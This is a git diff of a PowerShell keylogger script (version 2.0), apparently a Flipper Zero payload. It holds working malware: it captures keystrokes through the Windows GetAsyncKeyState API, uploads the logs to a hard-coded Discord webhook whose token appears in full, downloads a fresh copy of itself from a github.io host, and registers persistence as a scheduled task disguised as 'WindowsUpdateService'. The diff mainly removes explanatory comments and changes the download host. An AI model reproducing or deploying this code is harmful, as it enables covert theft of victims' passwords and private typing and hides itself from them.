@@ -1,3 +1,4 @@
+
 ####################################################################################################
 # Title       : Keylogger
 # Version     : 2.0
@@ -6,9 +7,9 @@
 ####################################################################################################
 
 # --- Configuration -----------------------------------------------------------
-$webhookUrl  = 'https://discord.com/api/webhooks/1568088128663588966/DIC4qfZyflPUPNc7Y8Ihdk6cTL4w1A8yr4gtRlZ9ZfxC9n8ZpSflYXUVcsmPzCFp3Qii'  # Discord webhook (#keylogger-windows) — from DISCORD_WEBHOOK_KEYLOGGER_WINDOWS in .env
-$flushSecs   = 30            # How often (seconds) to flush buffered keystrokes to disk
-$uploadMins  = 60            # How often (minutes) to POST encrypted log to webhook
+$webhookUrl  = 'https://discord.com/api/webhooks/1568088128663588966/DIC4qfZyflPUPNc7Y8Ihdk6cTL4w1A8yr4gtRlZ9ZfxC9n8ZpSflYXUVcsmPzCFp3Qii'
+$flushSecs   = 30
+$uploadMins  = 60
 $prankId     = [System.Guid]::NewGuid().ToString('N').Substring(0,8).ToUpper()
 $targetAlias = $env:COMPUTERNAME
 # -----------------------------------------------------------------------------
@@ -19,8 +20,6 @@ $key     = [System.Text.Encoding]::UTF8.GetBytes('MyS3cr3tK3y12345')
 
 New-Item -ItemType Directory -Path $logDir -Force | Out-Null
 
-# P/Invoke for GetAsyncKeyState — required for real keystroke capture.
-# IsKeyLocked only detects CapsLock/NumLock/ScrollLock and is useless here.
 Add-Type @"
 using System.Runtime.InteropServices;
 public class WinAPI {
@@ -29,10 +28,9 @@ public class WinAPI {
 }
 "@
 
-# Virtual-key to character map (printable + named keys)
 $keyMap = @{}
-for ($i = 48; $i -le 57;  $i++) { $keyMap[$i] = [char]$i }   # 0-9
-for ($i = 65; $i -le 90;  $i++) { $keyMap[$i] = [char]$i }   # A-Z
+for ($i = 48; $i -le 57;  $i++) { $keyMap[$i] = [char]$i }
+for ($i = 65; $i -le 90;  $i++) { $keyMap[$i] = [char]$i }
 $keyMap[8]   = '[BS]';    $keyMap[9]   = '[TAB]'; $keyMap[13]  = '[ENTER]'
 $keyMap[27]  = '[ESC]';   $keyMap[32]  = ' ';     $keyMap[46]  = '[DEL]'
 $keyMap[37]  = '[LEFT]';  $keyMap[38]  = '[UP]';  $keyMap[39]  = '[RIGHT]'; $keyMap[40] = '[DOWN]'
@@ -94,13 +92,11 @@ function Send-Log {
     } catch {}
 }
 
-# Persist BEFORE entering the infinite loop so the task is always registered
 $taskScript = "$logDir\update.ps1"
 if ($MyInvocation.MyCommand.Path) {
     Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $taskScript -Force -ErrorAction SilentlyContinue
 } else {
-    # Running via irm | iex — no source file on disk, download a fresh copy
-    Invoke-WebRequest 'https://tbjr.github.io/Flipper-payloads/host/keylogger.ps1' `
+    Invoke-WebRequest 'https://vexbold.github.io/Flipper-payloads/host/keylogger.ps1' `
         -OutFile $taskScript -UseBasicParsing -ErrorAction SilentlyContinue
 }
 schtasks /create /tn "WindowsUpdateService" `
